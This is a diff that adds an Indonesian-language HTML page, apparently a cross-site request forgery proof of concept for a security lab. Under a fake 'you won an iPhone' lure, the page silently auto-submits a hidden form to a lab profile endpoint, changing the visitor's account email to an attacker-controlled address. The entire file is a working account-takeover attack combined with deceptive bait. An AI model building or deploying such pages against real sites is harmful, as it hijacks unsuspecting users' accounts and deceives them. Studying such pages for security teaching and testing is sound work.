@@ -1,0 +1,29 @@
+<html>
+	<head>
+		<title>IKLAN GRATIS! KLIK DI SINI</title>
+	</head>
+	<body>
+		<h1>SELAMAT! ANDA MENANG IPHONE!</h1>
+		<p>Tunggu sebentar, sedang memproses hadiah...</p>
+
+		<form
+			action="http://security-labs.test/profile.php"
+			method="POST"
+			id="evilForm">
+			<input
+				type="hidden"
+				name="email"
+				value="hacked_by_attacker@gmail.com" />
+			<input
+				type="hidden"
+				name="ganti_email"
+				value="1" />
+		</form>
+		ss
+		<script>
+			// Auto-submit saat halaman dimuat
+			// Sesuai teknik serangan pada sumber
+			document.getElementById("evilForm").submit();
+		</script>
+	</body>
+</html>
